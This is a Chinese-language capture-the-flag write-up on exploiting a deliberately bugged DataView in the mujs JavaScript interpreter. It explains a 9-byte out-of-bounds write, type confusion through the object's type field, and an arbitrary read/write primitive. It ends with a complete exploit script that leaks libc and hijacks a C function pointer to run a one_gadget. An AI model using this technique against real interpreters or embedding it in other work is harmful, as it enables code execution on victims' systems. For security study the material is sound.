# `Mujs`

​		`diff`发现出题人自实现`DataView`视图。

​		认识`DataView`模块：https://developer.mozilla.org/zh-CN/Web/JavaScript/Reference/Global_Objects/DataView/prototype。

​		`ArrayBuffer`表示二进制数据的原始缓冲区，用于存储不同类型化数组的数据。我们无法直接读取或写入 `ArrayBuffers`，但是可以根据需要将其传递到类型化数组（`TypedArray`）或 `DataView`视图来操作二进制数据。简单来说，`DataView`实际上实现了一个直接对二进制数据进行读写操作的接口。

## 漏洞利用

### 利用思路

​		审计一下代码，发现`setUint8`存在`9`字节数组越界。

```c
static void Dv_setUint8(js_State *J)
{
	js_Object *self = js_toobject(J, 0);
	if (self->type != JS_CDATAVIEW) js_typeerror(J, "not an DataView");
	size_t index = js_tonumber(J, 1);
	uint8_t value = js_tonumber(J, 2);
	if (index < self->u.dataview.length+0x9) {
		self->u.dataview.data[index] = value;
	} else {
		js_error(J, "out of bounds access on DataView");
	}
}
```

![image-20220309150434526](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220309150434526.png)

​		实际上可以溢出`size`这个字段，形成`overlap chunk`。

​		看一下`js_Object`这个结构体：

```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; /* number of properties, for array sparseness check */
	js_Object *prototype;
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
		} a;
		struct {
			js_Function *function;
			js_Environment *scope;
		} f;
		struct {
			const char *name;
			js_CFunction function;
			js_CFunction constructor;
			int length;
			void *data;
			js_Finalize finalize;
		} c;
		js_Regexp r;
		struct {
			js_Object *target;
			js_Iterator *head;
		} iter;
		struct {
			const char *tag;
			void *data;
			js_HasProperty has;
			js_Put put;
			js_Delete delete;
			js_Finalize finalize;
		} user;
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
	js_Object *gcnext; /* allocation list */
	js_Object *gcroot; /* scan list */
	int gcmark;
};
```

​		`js_Object`结构体中包含一个联合体`u`，我们现在需要看一下这些联合体中的元素，看一下这个联合体在内存中占用了多大的空间。

```
gef➤  ptype /o self->u
/* offset    |  size */  type = union {
/*                 4 */    int boolean;
/*                 8 */    double number;
/*                16 */    struct {
/*    0      |     8 */        const char *string;
/*    8      |     4 */        int length;
/* XXX  4-byte padding  */

                               /* total size (bytes):   16 */
                           } s;
/*                 4 */    struct {
/*    0      |     4 */        int length;

                               /* total size (bytes):    4 */
                           } a;
/*                16 */    struct {
/*    0      |     8 */        js_Function *function;
/*    8      |     8 */        js_Environment *scope;

                               /* total size (bytes):   16 */
                           } f;
/*                48 */    struct {
/*    0      |     8 */        const char *name;
/*    8      |     8 */        js_CFunction function;
/*   16      |     8 */        js_CFunction constructor;
/*   24      |     4 */        int length;
/* XXX  4-byte hole  */
/*   32      |     8 */        void *data;
/*   40      |     8 */        js_Finalize finalize;

                               /* total size (bytes):   48 */
                           } c;
/*                24 */    js_Regexp r;
/*                16 */    struct {
/*    0      |     8 */        js_Object *target;
/*    8      |     8 */        js_Iterator *head;

                               /* total size (bytes):   16 */
                           } iter;
/*                48 */    struct {
/*    0      |     8 */        const char *tag;
/*    8      |     8 */        void *data;
/*   16      |     8 */        js_HasProperty has;
/*   24      |     8 */        js_Put put;
/*   32      |     8 */        js_Delete delete;
/*   40      |     8 */        js_Finalize finalize;

                               /* total size (bytes):   48 */
                           } user;
/*                16 */    struct {
/*    0      |     4 */        uint32_t length;
/* XXX  4-byte hole  */
/*    8      |     8 */        uint8_t *data;

                               /* total size (bytes):   16 */
                           } dataview;

                           /* total size (bytes):   48 */
                         }
        }
```

​		`js_CFunction`这个函数指针，这个函数指针在`jsR_callcfunction`函数中被调用。

```c
static void jsR_callcfunction(js_State *J, int n, int min, js_CFunction F)
{
	int i;
	js_Value v;

	for (i = n; i < min; ++i)
		js_pushundefined(J);

	F(J);
	v = *stackidx(J, -1);
	TOP = --BOT; /* clear stack */
	js_pushvalue(J, v);
}
```

​		`jsR_callcfunction`这个函数在`js_Call`这个函数中被调用。

```c
void js_call(js_State *J, int n)
{
	js_Object *obj;
	int savebot;

	if (n < 0)
		js_rangeerror(J, "number of arguments cannot be negative");

	if (!js_iscallable(J, -n-2))
		js_typeerror(J, "%s is not callable", js_typeof(J, -n-2));

	obj = js_toobject(J, -n-2);

	savebot = BOT;
	BOT = TOP - n - 1;

	if (obj->type == JS_CFUNCTION) {
		jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename, obj->u.f.function->line);
		if (obj->u.f.function->lightweight)
			jsR_calllwfunction(J, n, obj->u.f.function, obj->u.f.scope);
		else
			jsR_callfunction(J, n, obj->u.f.function, obj->u.f.scope);
		--J->tracetop;
	} else if (obj->type == JS_CSCRIPT) {
		jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename, obj->u.f.function->line);
		jsR_callscript(J, n, obj->u.f.function, obj->u.f.scope);
		--J->tracetop;
	} else if (obj->type == JS_CCFUNCTION) {
		jsR_pushtrace(J, obj->u.c.name, "native", 0);
		jsR_callcfunction(J, n, obj->u.c.length, obj->u.c.function);
		--J->tracetop;
	}

	BOT = savebot;
}
```

​		给这两个函数下断点。

![image-20220309170252301](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220309170252301.png)

![image-20220309170406090](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220309170406090.png)

​		如果通过类型混淆覆写掉这个指针，并且控制执行流程执行到`jsR_callFunction`，那可以形成一个很强大的利用原语。

### `OOB`泄露地址

​		除了`Dv_setUint8`存在数组越界，在`Dv_getUint32`，`Dv_getUint16`，`Dv_getUint8`中同样存在数组越界，可以实现`OOB`。（目前来说，泄露不出来什么

### 类型混淆

​		前面提到，`9`字节的数组越界写可以导致一个`overlap chunk`，实际上这个溢出也会导致一个类型混淆漏洞。

```javascript
b = DataView(0x68);
// obj: 0x5555555c8850
// obj->u.dataview.data: 0x5555555c88c0
a = DataView(0x48);
// obj: 0x5555555c8980
// obj->u.dataview.data: 0x5555555c89f0
b = DataView(0x48);
// obj: 0x5555555c8a90
// obj->u.dataview.data: 0x5555555c8b00
c = DataView(0x48);
// obj: 0x5555555c8b50
// obj->u.dataview.data: 0x5555555c8bc0

print(c);
b.setUint8(0x48+8,8);
print(c);
```

​		数组越界写，覆写掉`b->u.dataview.data[0x51]`，会改写`c->type`字段，这时候解释器会错误判断`c`的数据类型，输出如下。

​		![image-20220309194819340](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220309194819340.png)

​		在`javascript`中一切皆对象，对象是通过原型来继承的（原型链），`mujs`中判断数据类型是根据`js_Object`的`type`字段，改写为`8`恰好表示`js_CSTRING`，所以被识别为`String`对象。

![image-20220310111036305](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310111036305.png)

​		需要注意的是，要提前观察堆布局，确保最后两次申请的`js_Object`和`js_Object->u.dataview.data`的`chunk`都是紧邻的。

#### 从`9`字节越界写到向后控制整个堆

```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; /* number of properties, for array sparseness check */
	js_Object *prototype;
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
		} a;
		struct {
			js_Function *function;
			js_Environment *scope;
		} f;
		struct {
			const char *name;
			js_CFunction function;
			js_CFunction constructor;
			int length;
			void *data;
			js_Finalize finalize;
		} c;
		js_Regexp r;
		struct {
			js_Object *target;
			js_Iterator *head;
		} iter;
		struct {
			const char *tag;
			void *data;
			js_HasProperty has;
			js_Put put;
			js_Delete delete;
			js_Finalize finalize;
		} user;
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
	js_Object *gcnext; /* allocation list */
	js_Object *gcroot; /* scan list */
	int gcmark;
};
```

​		联合体中，与`u.dataview.length`变量在同一内存地址处的，还有`u.number`，`u.a.length`，`u.c.name`，这里利用的思路，通过溢出`type`字段造成类型混淆，混淆成别的数据类型，然后覆写`u.dataview.length`所在地址。

​		通过回溯对结构体变量的赋值，可以找到：

```c
static void Dp_setTime(js_State *J)
{
	js_setdate(J, 0, js_tonumber(J, 1));
}

static void js_setdate(js_State *J, int idx, double t)
{
	js_Object *self = js_toobject(J, idx);
	if (self->type != JS_CDATE)
		js_typeerror(J, "not a date");
	self->u.number = TimeClip(t);
	js_pushnumber(J, self->u.number);
}
```

​		可以调用`setTime`方法来改写`js_Object->u.number`的值。

​		这里要涉及到关于`javascript`原型链相关的一些知识，`poc`如下：

```c
b = DataView(0x68);
a = DataView(0x68);
b = DataView(0x68);
c = DataView(0x68);
d = new Date();

print(c);
b.setUint8(0x68+8,0xa);
//print(c);
print(c);
print(c.prototype);
//Date.prototype.setTime.bind(c)(1.09522e+12)
Date.prototype.setTime.bind(c)(1.09522e+12);

b.setUint8(0x68+8,16);
print(c.getLength());
```

​		四次申请`DataView`对象和原型的地址：

![image-20220310140031718](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310140031718.png)

![image-20220310140104859](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310140104859.png)

![image-20220310140258762](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310140258762.png)

![image-20220310140332094](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310140332094.png)

​		`Date`对象

![image-20220310140711595](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310140711595.png)

​		溢出修改`type`字段后，`c`的地址和原型的地址：

![image-20220310141658378](C:\Users\wolf\AppData\Roaming\Typora\typora-user-images\image-20220310141658378.png)

​		`javascript`的对象在从原型继承的时候，就确定了可以调用的方法，那么`DataView`对象就无法调用`Date`对象的方法，所以要用到`bind`绑定函数。

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind

​		然后重新把`c->type`修改为`0x10`，这时候实际上实现了从堆溢出到类型混淆再到任意地址读写，这时候回过头，我们发现可以泄露地址了。由于解释器中堆操作比较频繁，为了稳定泄露地址，在`Dataview`里申请一个`mmap`中的地址，由于`mmap`偏移与`libc`基址的偏移固定，所以可以通过偏移算出`libc`的基址。

#### 构造利用原语

​		要调用`jsR_callcfunction`，会检查`obj->type == JS_CCFUNCTION`。

```c
void js_call(js_State *J, int n)
{
	js_Object *obj;
	int savebot;

	if (n < 0)
		js_rangeerror(J, "number of arguments cannot be negative");

	if (!js_iscallable(J, -n-2))
		js_typeerror(J, "%s is not callable", js_typeof(J, -n-2));

	obj = js_toobject(J, -n-2);

	savebot = BOT;
	BOT = TOP - n - 1;

	if (obj->type == JS_CFUNCTION) {
		jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename, obj->u.f.function->line);
		if (obj->u.f.function->lightweight)
			jsR_calllwfunction(J, n, obj->u.f.function, obj->u.f.scope);
		else
			jsR_callfunction(J, n, obj->u.f.function, obj->u.f.scope);
		--J->tracetop;
	} else if (obj->type == JS_CSCRIPT) {
		jsR_pushtrace(J, obj->u.f.function->name, obj->u.f.function->filename, obj->u.f.function->line);
		jsR_callscript(J, n, obj->u.f.function, obj->u.f.scope);
		--J->tracetop;
	} else if (obj->type == JS_CCFUNCTION) {
		jsR_pushtrace(J, obj->u.c.name, "native", 0);
		jsR_callcfunction(J, n, obj->u.c.length, obj->u.c.function);
		--J->tracetop;
	}

	BOT = savebot;
}
```

### exp

```javascript
b = DataView(0x68)
// obj: 0x5555555c8850 obj->u.dataview.data: 0x5555555c88c0
a = DataView(0x68)
// obj: 0x5555555c8980 obj->u.dataview.data: 0x5555555c89f0
b = DataView(0x68)
// obj: 0x5555555c8ab0 obj->u.dataview.data: 0x5555555c8b20
c = DataView(0x68)
// obj: 0x5555555c8b90 obj->u.dataview.data: 0x5555555c8c00
// d = new Date();
d = DataView(0x68)
// obj: 0x5555555c8cc0
e = DataView(0x1000*0x1000)


print(c)
b.setUint8(0x68+8,0xa)
//print(c);
print(c)
print(c.prototype)
Date.prototype.setTime.bind(c)(1.09522e+12)
b.setUint8(0x68+8,16)
//print("0x"+c.getLength().toString(16))

onegadgets = [0xe3b2e,0xe3b31,0xe3b34,0xe3d23,0xe3d26]
main_arena_offset = 0x1ecb80
system_offset = 0x522c0
/*
for(var i=0;i<0x1000;i++)
{
    offset = i*4;
    tmp_addr1 = c.getUint32(offset)
    tmp_addr2 = c.getUint32(offset+4)
    leak_libc_addr = tmp_addr1 + tmp_addr2*0x100000000
    if(tmp_addr2>0x7f00){
        print(offset+" : "+leak_libc_addr.toString(16))
    }
}
*/

offset = 536
tmp_addr1 = c.getUint32(offset)
tmp_addr2 = c.getUint32(offset+4)
leak_libc_addr = tmp_addr1 + tmp_addr2*0x100000000
print(offset+" : "+leak_libc_addr.toString(16))

libc_offset = 16986096
libc_base = leak_libc_addr + libc_offset
system_addr = libc_base + system_offset
one_gadget = libc_base + onegadgets[1]
print("0x"+libc_base.toString(16))
print("0x"+system_addr.toString(16))
print("0x"+one_gadget.toString(16))

low_four_bytes = (one_gadget<<32)>>>32
high_four_bytes = parseInt(one_gadget/0x100000000)
print("0x"+low_four_bytes.toString(16))
print("0x"+high_four_bytes.toString(16))

c.setUint8(0xc0,0x4)
c.setUint32(0xe8,low_four_bytes)
c.setUint32(0xec,high_four_bytes)
print(" ")
d()
```

